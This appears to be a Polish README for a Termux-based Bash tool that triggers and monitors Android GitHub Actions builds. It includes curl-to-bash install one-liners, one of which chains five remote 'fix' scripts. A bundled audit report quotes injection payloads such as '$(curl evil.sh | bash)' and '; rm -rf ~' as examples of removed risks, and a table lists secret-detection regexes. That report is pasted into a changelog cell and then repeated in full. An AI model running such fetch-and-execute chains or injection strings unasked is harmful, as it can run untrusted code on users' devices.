# SMART COMPILE ULTIMATE v3.0
### SecFERRO Division ◈ FerroART ◈ [FERRO//ANON]
> `anonymousik.is-a.dev` · Android CI/CD Backend · Termux-native

---

## Szybka instalacja

### curl
```bash
curl -fsSL https://anonymousik.is-a.dev/scripts/scu/install.sh | bash
```

### wget
```bash
wget -qO- https://anonymousik.is-a.dev/scripts/scu/install.sh | bash
```

### Ręcznie (zalecane przy pierwszym użyciu)
```bash
# Pobierz skrypt
curl -fsSL https://anonymousik.is-a.dev/scripts/scu/smart_compile_ultimate.sh \
  -o ~/bin/scu.sh

# Nadaj uprawnienia
chmod +x ~/bin/scu.sh

# Weryfikacja SHA-256 (porównaj z checksums.txt)
curl -fsSL https://anonymousik.is-a.dev/scripts/scu/checksums.txt | sha256sum --check
```

### Termux (Android)
```bash
pkg update -y && pkg install -y git gh curl jq
curl -fsSL https://anonymousik.is-a.dev/scripts/scu/install.sh | bash
```

---

## Wymagania systemowe

| Zależność | Minimalna wersja | Instalacja (Termux) |
|-----------|-----------------|---------------------|
| `bash`    | 5.0+            | `pkg install bash`  |
| `git`     | 2.30+           | `pkg install git`   |
| `gh`      | 2.40+           | `pkg install gh`    |
| `curl`    | 7.68+           | `pkg install curl`  |
| `jq`      | 1.6+            | `pkg install jq`    |
| `gzip`    | dowolna         | `pkg install gzip`  |
| `mail`    | opcjonalne      | `pkg install mailutils` |
| `termux-toast` | opcjonalne | `pkg install termux-api` |

> SCU automatycznie wykrywa brakujące pakiety i próbuje je zainstalować przez `pkg` lub `apt-get`.

---

## Pierwsze uruchomienie

```bash
# 1. Autoryzacja GitHub CLI (wymagana)
gh auth login

# 2. Uruchom SCU — pierwsze uruchomienie generuje config
~/bin/scu.sh --help

# 3. Edytuj konfigurację
~/bin/scu.sh --edit-config

# 4. Testowy dry-run (zero efektów ubocznych)
~/bin/scu.sh --repo mojOrg/mojeApp --dry-run --log-level DEBUG
```

---

## Plik konfiguracyjny

Generowany automatycznie przy pierwszym uruchomieniu w `~/.scu/scu.conf`.

```ini
# ~/.scu/scu.conf
# Wartości nadpisywane przez flagi CLI — CLI ma zawsze priorytet.

REPO_NAME=myorg/neurosync-ai
WORKFLOW_FILE=android-build.yml
BRANCH=main
BUILD_OUTPUT_DIR=/data/data/com.termux/files/home/build_output
ARTIFACT_NAMES=neurosync-wearos-apk
AUTO_YES=false
RETRIES=3
LOG_LEVEL=INFO
WEBHOOK_URL=https://hooks.slack.com/services/XXX/YYY/ZZZ
NOTIFY_EMAIL=
TERMUX_NOTIFY=true
VERIFY_CHECKSUMS=true
SECRET_SCAN=true
```

---

## Opcje CLI — pełna tabela

### Opcje główne

| Flaga | Alias | Wartość | Opis |
|-------|-------|---------|------|
| `--repo` | `-r` | `owner/name` | Nazwa repozytorium GitHub |
| `--workflow` | `-w` | `plik.yml` | Nazwa pliku workflow w `.github/workflows/` |
| `--branch` | `-b` | `main` | Gałąź git dla dispatch i push |
| `--output` | `-o` | `/ścieżka` | Katalog docelowy artefaktów APK |
| `--artifacts` | `-a` | `apk,mapping` | CSV nazw artefaktów do pobrania |
| `--variants` | `-v` | `debug,release` | Build matrix — osobny dispatch per wariant |
| `--inputs` | `-i` | `{"key":"val"}` | JSON inputs dla `workflow_dispatch` |
| `--retries` | — | `3` | Liczba ponownych prób przy błędach |
| `--log-level` | — | `INFO` | Poziom logowania (patrz sekcja Logi) |

### Flagi sterujące pipeline

| Flaga | Opis |
|-------|------|
| `--yes` / `-y` | Auto-akceptuj wszystkie pytania interaktywne |
| `--skip-push` | Pomiń `git add/commit/push` |
| `--skip-trigger` | Pomiń dispatch workflow (tylko monitoring istniejącego) |
| `--skip-download` | Pomiń pobieranie artefaktów |
| `--dry-run` | Symulacja — żadne operacje nie są wykonywane |
| `--force` | Nadpisz lock file (np. po crash poprzedniej instancji) |
| `--no-checksums` | Wyłącz weryfikację SHA-256 po pobraniu |
| `--no-secret-scan` | Wyłącz skan lekowania sekretów przed pushem |
| `--no-notify` | Wyłącz wszystkie powiadomienia (webhook/mail/toast) |

### Notyfikacje

| Flaga | Wartość | Opis |
|-------|---------|------|
| `--webhook` | URL | Slack / Discord webhook |
| `--email` | adres | Powiadomienia e-mail (wymaga `mail`) |

### Narzędziowe

| Flaga | Opis |
|-------|------|
| `--help` / `-h` | Pokaż pomoc |
| `--version` | Wyświetl wersję SCU |
| `--config` | Wyświetl ścieżkę config |
| `--edit-config` | Otwórz config w `$EDITOR` |
| `--show-logs` | Lista ostatnich logów |

---

## Poziomy logowania

```
TRACE   → każde wywołanie funkcji, debug niskopoziomowy
DEBUG   → backoff timing, polling status, JSON parsing
INFO    → standardowy output (domyślny)
WARN    → niekrytyczne ostrzeżenia (niezatwierdzone zmiany, retry)
ERROR   → błędy bez zatrzymania skryptu
FATAL   → błąd krytyczny → exit 1 + powiadomienie
```

Ustaw przez `--log-level DEBUG` lub `LOG_LEVEL=DEBUG` w `scu.conf`.

---

## Przykłady użycia

### Podstawowy build debug
```bash
scu.sh --repo mojOrg/mojeApp --branch main
```

### Build matrix: debug + release równolegle
```bash
scu.sh \
  --repo mojOrg/mojeApp \
  --variants debug,release \
  --artifacts "neurosync-wearos-apk,neurosync-mapping" \
  --yes
```

### Tylko monitoring istniejącego runa (np. po restarcie)
```bash
scu.sh \
  --skip-push \
  --skip-trigger \
  --log-level DEBUG
```

### Custom inputs dla workflow parametryzowanego
```bash
scu.sh \
  --inputs '{"flavor":"playbox","minSdk":"26","signing":"debug"}' \
  --branch feature/titanium-v2 \
  --no-secret-scan
```

### Pełny CI/CD z powiadomieniami Slack
```bash
scu.sh \
  --repo myOrg/myApp \
  --variants release \
  --artifacts "release-apk,mapping,bundle" \
  --webhook "https://hooks.slack.com/services/XXX/YYY/ZZZ" \
  --retries 5 \
  --yes \
  --log-level INFO
```

### Dry-run diagnostyczny
```bash
scu.sh \
  --repo mojOrg/mojeApp \
  --variants debug,release \
  --dry-run \
  --log-level TRACE \
  2>&1 | tee ~/scu_dryrun.log
```

### Użycie przez wget z parametrami (one-liner CI)
```bash
wget -qO- https://anonymousik.is-a.dev/scu/smart_compile_ultimate.sh \
  | bash -s -- \
    --repo mojOrg/mojeApp \
    --branch main \
    --yes \
    --no-notify \
    --log-level WARN
```

### Użycie przez curl z parametrami (one-liner CI)
```bash
curl -fsSL https://anonymousik.is-a.dev/scu/smart_compile_ultimate.sh \
  | bash -s -- \
    --repo mojOrg/mojeApp \
    --variants debug,release \
    --webhook "$SLACK_WEBHOOK" \
    --yes
```

---

## Pipeline — kolejność wykonania

```
[0] Wczytaj scu.conf → nadpisz przez CLI args
 │
[1] Acquire lock file (~/.scu/locks/scu.lock)
 │
[2] _require_cmds  → weryfikacja/instalacja: gh git curl jq
 │
[3] _self_diagnose → wersje narzędzi, środowisko, git status
 │
[4] _healthcheck_github → gh auth status / login
 │
[5] _init_repo → gh repo view / create --private
 │
[6] _audit_workflow → weryfikacja .github/workflows/*.yml
 │    └── generator YAML jeśli brak (JDK 21, Gradle cache, signing)
[7] _sync_code
 │    ├── _secret_scan → grep staged files pod wzorce API keys
 │    └── git add -A → commit → push
[8] _trigger_workflow
 │    ├── _validate_inputs_json
 │    └── pętla po --variants → gh workflow run + backoff retry
[9] _wait_for_run
 │    └── polling z event-time guard (filtr po createdAt >= dispatch_time)
[10] _monitor_execution
 │    └── gh run watch → fallback: manual polling co 30s (max 30min)
[11] _download_artifacts
 │    ├── iteracja CSV artifact_names
 │    └── sha256sum → .sha256 per artefakt
[12] _generate_report
 │    ├── JSON: ~/.scu/reports/scu_report_*.json
 │    └── TXT:  ~/.scu/reports/scu_report_*.txt
 │
[EXIT] trap EXIT → _release_lock + log błędu + notify
```

---

## Struktura katalogów SCU

```
~/.scu/
├── scu.conf              ← konfiguracja (INI)
├── logs/
│   ├── scu_20260505_143012_1234.log   ← aktywne
│   └── scu_20260430_091200_5678.log.gz ← zrotowane (gzip)
├── locks/
│   └── scu.lock          ← PID aktywnej instancji
└── reports/
    ├── scu_report_20260505_143500.json
    └── scu_report_20260505_143500.txt

~/build_output/
└── neurosync-wearos-apk/
    ├── app-debug.apk
    └── neurosync-wearos-apk.sha256
```

---

## Wygenerowany workflow Android (domyślny)

SCU generuje `.github/workflows/android-build.yml` jeśli plik nie istnieje:

```yaml
name: Android Build — SCU
on:
  workflow_dispatch:
    inputs:
      variant:
        description: 'Build variant (debug|release)'
        default: 'debug'
  push:
    branches: [main]

jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 60
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-java@v4
        with: { distribution: temurin, java-version: '21' }
      - uses: actions/cache@v4          # cache ~/.gradle
      - uses: gradle/wrapper-validation-action@v2
      - run: ./gradlew assemble${{ inputs.variant }}
      - uses: actions/upload-artifact@v4
        with:
          name: neurosync-wearos-apk
          retention-days: 7
```

---

## Secret Scanner — wykrywane wzorce

| Wzorzec | Typ sekretu |
|---------|-------------|
| `AKIA[0-9A-Z]{16}` | AWS Access Key ID |
| `ghp_[A-Za-z0-9]{36}` | GitHub PAT (classic) |
| `github_pat_` | GitHub fine-grained PAT |
| `sk-[A-Za-z0-9]{32,}` | OpenAI / Stripe Secret Key |
| `BEGIN (RSA\|EC\|DSA\|OPENSSH) PRIVATE` | Klucz prywatny PEM |
| `password\s*=\s*["'][^\s]{8,}` | Hasło w pliku konfiguracyjnym |
| `token\s*=\s*["'][A-Za-z0-9]{16,}` | Generyczny token |

Skan dotyczy wyłącznie **staged files** (`git diff --cached`). Wyłącz przez `--no-secret-scan` lub `SECRET_SCAN=false` w config.

---

## Zmienne środowiskowe (alternatywa dla CLI)

Wszystkie opcje można przekazać przez env — przydatne w CI/CD pipeline:

```bash
export REPO_NAME="mojOrg/mojeApp"
export BRANCH="release/v3"
export ARTIFACT_NAMES="release-apk,mapping"
export AUTO_YES="true"
export WEBHOOK_URL="https://hooks.slack.com/..."
export LOG_LEVEL="WARN"

scu.sh  # odczyta z env
```

---

## Troubleshooting

### `gh auth status` — brak autoryzacji
```bash
gh auth login --web
# lub token:
gh auth login --with-token < ~/.gh_token
```

### Lock file blokuje start
```bash
# Sprawdź czy proces żyje
cat ~/.scu/locks/scu.lock   # → PID
kill -0 <PID> 2>/dev/null && echo "żyje" || echo "martwy"

# Jeśli martwy:
scu.sh --force
```

### Workflow run nie jest wykrywany
Problem: szybkie kolejne dispatch mylą event-time guard.
```bash
# Zwiększ timeout polingu
# Edytuj _wait_for_run: attempts=25, sleep start: 12s
scu.sh --log-level DEBUG --skip-push
```

### Rate limit GitHub API
```bash
# Sprawdź pozostały limit
gh api rate_limit --jq '.rate | {limit,remaining,reset}'
# SCU automatycznie czeka 60s przy wykryciu 403/429
```

### APK nie pojawia się w artefaktach
Sprawdź czy ścieżka w `upload-artifact` pasuje do output Gradle:
```bash
# Standardowe ścieżki:
# debug:   app/build/outputs/apk/debug/app-debug.apk
# release: app/build/outputs/apk/release/app-release.apk
```

---
# Zestaw naprawczy dla urządzeń mobilnych opartych na termux [⚠️ NOWOŚĆ V2.0.1]

```bash
curl -fsSL https://github.com/anonymousik/anonymousik.github.io/blob/main/scripts/scu/smart_compile_fix.sh | bash && curl -fsSL https://github.com/anonymousik/anonymousik.github.io/blob/main/scripts/scu/smart_compile_fix2.sh | bash && curl -fsSL https://github.com/anonymousik/anonymousik.github.io/blob/main/scripts/scu/smart_compile_fix3.sh | bash && curl -fsSL https://github.com/anonymousik/anonymousik.github.io/blob/main/scripts/scu/smart_compile_fix4.sh | bash && curl -fsSL https://github.com/anonymousik/anonymousik.github.io/blob/main/scripts/scu/perms_fix.sh | bash
```



## Aktualizacja SCU

```bash
# Sprawdź wersję
scu.sh --version

# Aktualizuj (nadpisz plik)
curl -fsSL https://anonymousik.is-a.dev/scu/smart_compile_ultimate.sh \
  -o ~/bin/scu.sh && chmod +x ~/bin/scu.sh

# Zweryfikuj checksum po aktualizacji
curl -fsSL https://anonymousik.is-a.dev/scu/checksums.txt \
  | grep scu.sh | sha256sum --check
```

---

## Changelog

| Wersja | Data | Zmiany |
|--------|------|--------|
| 3.0.0 | 2026-05-06 | # SCU v3.0 — Audit & Fix Report
### SecFERRO Division ◈ [FERRO//ANON]

---

## Krytyczne błędy naprawione (było w v2.0)

### 1. `eval` w `_retry()` — Code Injection
```bash
# ❌ v2.0 — eval z niezaufanego inputu
output=$(eval "${cmd[@]}" 2>&1) || exit_code=$?

# ✅ v3.0 — bezpieczne "$@" passing
output=$("$@" 2>&1) || exit_code=$?
```
**Ryzyko:** Każdy string w tablicy `cmd[]` był wykonywany przez `eval` —
argument zawierający `; rm -rf ~` lub `$(curl evil.sh | bash)` zostałby wykonany.
Wyeliminowane całkowicie.

---

### 2. `set -Eeuo pipefail` wykomentowany — brak detekcji błędów
```bash
# ❌ v2.0
#set -Eeuo pipefail
#IFS=$'\n\t'

# ✅ v3.0 — włączony z precyzyjnymi || true gdzie potrzeba
set -Eeuo pipefail
IFS=$'\n\t'
```
**Skutek v2.0:** Każdy błąd był cicho ignorowany. Skrypt kontynuował po `fatal`
jeśli `exit 1` nie był w głównym procesie. W v3.0 każde nieobsłużone polecenie
terminuje skrypt + loguje linię/komendę przez `trap ERR`.

---

### 3. Log rotation — empty glob expansion crash
```bash
# ❌ v2.0 — przy braku plików .log: local logs=() → array z literałem "*.log"
local logs=("$LOG_DIR"/scu_*.log)

# ✅ v3.0 — find z -print0, nullglob-safe
while IFS= read -r -d '' f; do
  logs+=("$f")
done < <(find "$LOG_DIR" -maxdepth 1 -name 'scu_*.log' -print0 | sort -z)
```
**Skutek v2.0:** Przy pierwszym uruchomieniu (brak logów) `count=1`
i skrypt próbował `gzip` na literale `~/.scu/logs/scu_*.log`.

---

### 4. Config parser — wartości z znakiem `=` obcinane
```bash
# ❌ v2.0 — IFS='=' read -r key val → WEBHOOK_URL=https://x.com?a=1&b=2 → val="https://x.com?a"
while IFS='=' read -r key val; do ...

# ✅ v3.0 — rozbicie po PIERWSZYM '=' przez parameter expansion
local key="${line%%=*}"
local val="${line#*=}"
```
**Skutek v2.0:** Każda wartość zawierająca `=` (URL webhook, JWT token,
base64 string) była obcinana po pierwszym znaku `=`.

---

### 5. Zduplikowany git-check w `_load_conf()` i `main()`
```bash
# ❌ v2.0 — sprawdzenie w _load_conf() PRZED parsowaniem --dry-run
# Powodowało fatal przy --help i --version (które nie potrzebują Git)

# ✅ v3.0 — jeden check w main(), po _parse_args(), z pomocnym komunikatem
if ! git rev-parse --is-inside-work-tree &>/dev/null; then
  echo "..."; echo "  Uruchom: git init && git remote add origin ..."; exit 1
fi
```

---

### 6. `_parse_args` — brak guard przed `shift 2` (out-of-bounds)
```bash
# ❌ v2.0
-r|--repo) REPO_NAME="$2"; shift 2 ;;
# Przy: scu.sh --repo  (bez wartości) → $2 = następna flaga lub crash

# ✅ v3.0
-r|--repo)
  (( $# > 1 )) || fatal "--repo wymaga argumentu"
  REPO_NAME="$2"; shift 2 ;;
```
Wszystkie 9 flag przyjmujących argument mają guard `(( $# > 1 ))`.

---

### 7. `--log-level` — brak walidacji wartości
```bash
# ❌ v2.0 — LOG_LEVEL="INVALID" powodował błąd w każdym wywołaniu _log_enabled()
LOG_LEVEL="${2^^}"; shift 2

# ✅ v3.0 — walidacja przez associative array
LOG_LEVEL="${2^^}"
[[ -v LOG_LEVELS[$LOG_LEVEL] ]] || fatal "Nieprawidłowy log-level: $LOG_LEVEL"
```

---

### 8. `_backoff_sleep` — division by zero przy `exp < 5`
```bash
# ❌ v2.0
local jitter=$(( RANDOM % (exp / 5 + 1) ))
# Przy exp=1: exp/5=0 → RANDOM % 1 = zawsze 0 (ale nieczytelne)
# Przy exp=0 (możliwe przy base=0): exp/5+1=1 → OK, ale exp=0 powoduje sleep 0

# ✅ v3.0
(( exp < 1 )) && exp=1
local jitter=0
if (( exp >= 5 )); then
  jitter=$(( RANDOM % (exp / 5) ))
fi
```

---

### 9. `_secret_scan` — `xargs` portability (macOS nie ma `-r`)
```bash
# ❌ v2.0 — xargs -r nie istnieje na macOS/BSD
git diff --cached --name-only | xargs -I{} grep -rlP "$pattern" -- {}

# ✅ v3.0 — iteracja po tablicy staged_files[] (null-delimited, bezpieczna)
while IFS= read -r -d '' f; do staged_files+=("$f"); done \
  < <(git diff --cached --name-only -z)
for f in "${staged_files[@]}"; do grep -qP "$pattern" "$f" && hits+=("$f"); done
```

---

### 10. `_wait_for_run` — `dispatch_time` zapisywany PO `sleep 8`
```bash
# ❌ v2.0
sleep 8
local dispatch_time; dispatch_time="$(date -u +%Y-%m-%dT%H:%M:%SZ)"
# dispatch_time = 8 sekund PO dispatchu → filtrowało własne runy jako "zbyt stare"

# ✅ v3.0 — dispatch_time przekazywany jako parametr z _run_single_dispatch()
local dispatch_time="${2:-$(date -u +%Y-%m-%dT%H:%M:%SZ)}"
# Zapisany PRZED dispathem, sleep 8 po nim
```

---

### 11. `_generate_report` — `gh run view` na `run_id=N/A`
```bash
# ❌ v2.0 — przy SKIP_TRIGGER lub DRY_RUN: run_id="N/A" → gh api call crashował
conclusion=$(gh run view "$run_id" --json conclusion ...)

# ✅ v3.0 — guard numeryczny
if [[ "$run_id" =~ ^[0-9]+$ ]]; then
  conclusion=$(gh run view "$run_id" ...)
fi
```

---

### 12. `_trigger_workflow` — `eval` przy dispatch args
```bash
# ❌ v2.0 — dispatch_args budowane przez konkatenację string, wykonywane przez eval
if eval gh workflow run "$WORKFLOW_FILE" --ref "$BRANCH" $payload; then

# ✅ v3.0 — czysta tablica Bash, bez eval
local -a dispatch_args=(gh workflow run "$WORKFLOW_FILE" --ref "$BRANCH")
dispatch_args+=(--field "variant=$variant")
_retry "${dispatch_args[@]}"
```

---

### 13. `_monitor_execution` — brak `--exit-status` w `gh run watch`
```bash
# ❌ v2.0
gh run watch "$run_id"
# gh run watch bez --exit-status zawsze zwraca 0 nawet przy failure!

# ✅ v3.0
gh run watch "$run_id" --exit-status
# + pełny fallback polling + gh run view --log-failed | tail -150
```

---

### 14. Multi-run tracking — brak przy build matrix
```bash
# ❌ v2.0 — jeden _CURRENT_RUN_ID, matrix gubiła poprzednie run IDs
_CURRENT_RUN_ID=""

# ✅ v3.0 — tablica _RUN_IDS[]
declare -a _RUN_IDS=()
# SIGINT anuluje WSZYSTKIE aktywne runy
for rid in "${_RUN_IDS[@]}"; do gh run cancel "$rid"; done
```

---

### 15. Download — brak atomowego zapisu (partial download)
```bash
# ❌ v2.0 — pobieranie bezpośrednio do BUILD_OUTPUT_DIR
gh run download "$run_id" -n "$artifact" -D "$BUILD_OUTPUT_DIR/$artifact"
# Przy przerwaniu: częściowo pobrane pliki w finalnym miejscu

# ✅ v3.0 — atomic: temp dir → mv do final
local tmp_dest="${TEMP_DIR}/artifact_${artifact//\//_}"
gh run download ... -D "$tmp_dest" && mv "$tmp_dest" "$final_dest"
```

---

# SCU v3.0 — Audit & Fix Report
### SecFERRO Division ◈ [FERRO//ANON]

---

## Krytyczne błędy naprawione (było w v2.0)

### 1. `eval` w `_retry()` — Code Injection
```bash
# ❌ v2.0 — eval z niezaufanego inputu
output=$(eval "${cmd[@]}" 2>&1) || exit_code=$?

# ✅ v3.0 — bezpieczne "$@" passing
output=$("$@" 2>&1) || exit_code=$?
```
**Ryzyko:** Każdy string w tablicy `cmd[]` był wykonywany przez `eval` —
argument zawierający `; rm -rf ~` lub `$(curl evil.sh | bash)` zostałby wykonany.
Wyeliminowane całkowicie.

---

### 2. `set -Eeuo pipefail` wykomentowany — brak detekcji błędów
```bash
# ❌ v2.0
#set -Eeuo pipefail
#IFS=$'\n\t'

# ✅ v3.0 — włączony z precyzyjnymi || true gdzie potrzeba
set -Eeuo pipefail
IFS=$'\n\t'
```
**Skutek v2.0:** Każdy błąd był cicho ignorowany. Skrypt kontynuował po `fatal`
jeśli `exit 1` nie był w głównym procesie. W v3.0 każde nieobsłużone polecenie
terminuje skrypt + loguje linię/komendę przez `trap ERR`.

---

### 3. Log rotation — empty glob expansion crash
```bash
# ❌ v2.0 — przy braku plików .log: local logs=() → array z literałem "*.log"
local logs=("$LOG_DIR"/scu_*.log)

# ✅ v3.0 — find z -print0, nullglob-safe
while IFS= read -r -d '' f; do
  logs+=("$f")
done < <(find "$LOG_DIR" -maxdepth 1 -name 'scu_*.log' -print0 | sort -z)
```
**Skutek v2.0:** Przy pierwszym uruchomieniu (brak logów) `count=1`
i skrypt próbował `gzip` na literale `~/.scu/logs/scu_*.log`.

---

### 4. Config parser — wartości z znakiem `=` obcinane
```bash
# ❌ v2.0 — IFS='=' read -r key val → WEBHOOK_URL=https://x.com?a=1&b=2 → val="https://x.com?a"
while IFS='=' read -r key val; do ...

# ✅ v3.0 — rozbicie po PIERWSZYM '=' przez parameter expansion
local key="${line%%=*}"
local val="${line#*=}"
```
**Skutek v2.0:** Każda wartość zawierająca `=` (URL webhook, JWT token,
base64 string) była obcinana po pierwszym znaku `=`.

---

### 5. Zduplikowany git-check w `_load_conf()` i `main()`
```bash
# ❌ v2.0 — sprawdzenie w _load_conf() PRZED parsowaniem --dry-run
# Powodowało fatal przy --help i --version (które nie potrzebują Git)

# ✅ v3.0 — jeden check w main(), po _parse_args(), z pomocnym komunikatem
if ! git rev-parse --is-inside-work-tree &>/dev/null; then
  echo "..."; echo "  Uruchom: git init && git remote add origin ..."; exit 1
fi
```

---

### 6. `_parse_args` — brak guard przed `shift 2` (out-of-bounds)
```bash
# ❌ v2.0
-r|--repo) REPO_NAME="$2"; shift 2 ;;
# Przy: scu.sh --repo  (bez wartości) → $2 = następna flaga lub crash

# ✅ v3.0
-r|--repo)
  (( $# > 1 )) || fatal "--repo wymaga argumentu"
  REPO_NAME="$2"; shift 2 ;;
```
Wszystkie 9 flag przyjmujących argument mają guard `(( $# > 1 ))`.

---

### 7. `--log-level` — brak walidacji wartości
```bash
# ❌ v2.0 — LOG_LEVEL="INVALID" powodował błąd w każdym wywołaniu _log_enabled()
LOG_LEVEL="${2^^}"; shift 2

# ✅ v3.0 — walidacja przez associative array
LOG_LEVEL="${2^^}"
[[ -v LOG_LEVELS[$LOG_LEVEL] ]] || fatal "Nieprawidłowy log-level: $LOG_LEVEL"
```

---

### 8. `_backoff_sleep` — division by zero przy `exp < 5`
```bash
# ❌ v2.0
local jitter=$(( RANDOM % (exp / 5 + 1) ))
# Przy exp=1: exp/5=0 → RANDOM % 1 = zawsze 0 (ale nieczytelne)
# Przy exp=0 (możliwe przy base=0): exp/5+1=1 → OK, ale exp=0 powoduje sleep 0

# ✅ v3.0
(( exp < 1 )) && exp=1
local jitter=0
if (( exp >= 5 )); then
  jitter=$(( RANDOM % (exp / 5) ))
fi
```

---

### 9. `_secret_scan` — `xargs` portability (macOS nie ma `-r`)
```bash
# ❌ v2.0 — xargs -r nie istnieje na macOS/BSD
git diff --cached --name-only | xargs -I{} grep -rlP "$pattern" -- {}

# ✅ v3.0 — iteracja po tablicy staged_files[] (null-delimited, bezpieczna)
while IFS= read -r -d '' f; do staged_files+=("$f"); done \
  < <(git diff --cached --name-only -z)
for f in "${staged_files[@]}"; do grep -qP "$pattern" "$f" && hits+=("$f"); done
```

---

### 10. `_wait_for_run` — `dispatch_time` zapisywany PO `sleep 8`
```bash
# ❌ v2.0
sleep 8
local dispatch_time; dispatch_time="$(date -u +%Y-%m-%dT%H:%M:%SZ)"
# dispatch_time = 8 sekund PO dispatchu → filtrowało własne runy jako "zbyt stare"

# ✅ v3.0 — dispatch_time przekazywany jako parametr z _run_single_dispatch()
local dispatch_time="${2:-$(date -u +%Y-%m-%dT%H:%M:%SZ)}"
# Zapisany PRZED dispathem, sleep 8 po nim
```

---

### 11. `_generate_report` — `gh run view` na `run_id=N/A`
```bash
# ❌ v2.0 — przy SKIP_TRIGGER lub DRY_RUN: run_id="N/A" → gh api call crashował
conclusion=$(gh run view "$run_id" --json conclusion ...)

# ✅ v3.0 — guard numeryczny
if [[ "$run_id" =~ ^[0-9]+$ ]]; then
  conclusion=$(gh run view "$run_id" ...)
fi
```

---

### 12. `_trigger_workflow` — `eval` przy dispatch args
```bash
# ❌ v2.0 — dispatch_args budowane przez konkatenację string, wykonywane przez eval
if eval gh workflow run "$WORKFLOW_FILE" --ref "$BRANCH" $payload; then

# ✅ v3.0 — czysta tablica Bash, bez eval
local -a dispatch_args=(gh workflow run "$WORKFLOW_FILE" --ref "$BRANCH")
dispatch_args+=(--field "variant=$variant")
_retry "${dispatch_args[@]}"
```

---

### 13. `_monitor_execution` — brak `--exit-status` w `gh run watch`
```bash
# ❌ v2.0
gh run watch "$run_id"
# gh run watch bez --exit-status zawsze zwraca 0 nawet przy failure!

# ✅ v3.0
gh run watch "$run_id" --exit-status
# + pełny fallback polling + gh run view --log-failed | tail -150
```

---

### 14. Multi-run tracking — brak przy build matrix
```bash
# ❌ v2.0 — jeden _CURRENT_RUN_ID, matrix gubiła poprzednie run IDs
_CURRENT_RUN_ID=""

# ✅ v3.0 — tablica _RUN_IDS[]
declare -a _RUN_IDS=()
# SIGINT anuluje WSZYSTKIE aktywne runy
for rid in "${_RUN_IDS[@]}"; do gh run cancel "$rid"; done
```

---

### 15. Download — brak atomowego zapisu (partial download)
```bash
# ❌ v2.0 — pobieranie bezpośrednio do BUILD_OUTPUT_DIR
gh run download "$run_id" -n "$artifact" -D "$BUILD_OUTPUT_DIR/$artifact"
# Przy przerwaniu: częściowo pobrane pliki w finalnym miejscu

# ✅ v3.0 — atomic: temp dir → mv do final
local tmp_dest="${TEMP_DIR}/artifact_${artifact//\//_}"
gh run download ... -D "$tmp_dest" && mv "$tmp_dest" "$final_dest"
```

---

## Nowe funkcje v3.0

| Funkcja | Opis |
|---------|------|
| `_preflight()` | 10 sprawdzeń: env, bash ver, tools, gh ver, sieć, dysk, HOME, git config, jq, output dir |
| `_validate_branch()` | Weryfikacja istnienia branch w remote przed dispatch |
| `--clear-cache` flag | Przekazuje `clear-cache=true` jako workflow input |
| `--show-reports` flag | Lista ostatnich raportów JSON+TXT |
| `--retries` validation | Guard `[[ "$2" =~ ^[0-9]+$ ]]` |
| gh permissions check | `viewerPermission` — ostrzeżenie przy READ-only |
| Git user/email check | Ostrzeżenie przy nieskonf. git identity |
| Custom inputs normalizacja | Auto-konwersja non-string values na stringi (jq `tostring`) |
| `TEMP_DIR` cleanup | `mktemp` + `trap EXIT rm -rf` |
| Bash 4.0 guard | Exit 1 przy bash < 4 (associative arrays) |
| `_tee_log()` | Bezpieczny tee — fallback do `cat` gdy LOGFILE niezainicjowany |
| Workflow YAML v3 | Produkcyjny — identyczny z doc3 (validate+build+notify, SDK 34, NDK 27) |

---

## Kompatybilność

| Środowisko | Status |
|------------|--------|
| Termux (Android 7+, bash 5.x) | ✅ Pełna |
| Ubuntu 22.04+ (bash 5.x) | ✅ Pełna |
| macOS (bash 5+ przez brew) | ✅ Pełna |
| Alpine Linux (bash 5+) | ✅ Pełna |
| bash < 4.0 (macOS system bash 3.2) | ❌ Blocked — komunikat fatal |

---

## Struktura plików

```
~/.scu/
├── scu.conf                          ← config INI
├── logs/
│   ├── scu_20260505_143012_1234.log  ← aktywne (max 20)
│   └── scu_20260430_091200_5678.log.gz  ← gzip (stare)
├── locks/
│   └── scu.lock                      ← PID (auto-cleanup)
├── reports/
│   ├── scu_report_2026-05-05T14:35:00Z.json
│   └── scu_report_2026-05-05T14:35:00Z.txt
└── tmp.XXXXXX/                       ← mktemp, czyszczony przez trap
    └── artifact_neurosync-wearos-apk/  ← staging przed mv
```

---

*[FERRO//ANON] · SecFERRO Division · SCU v3.0.0 · 2026-05-05*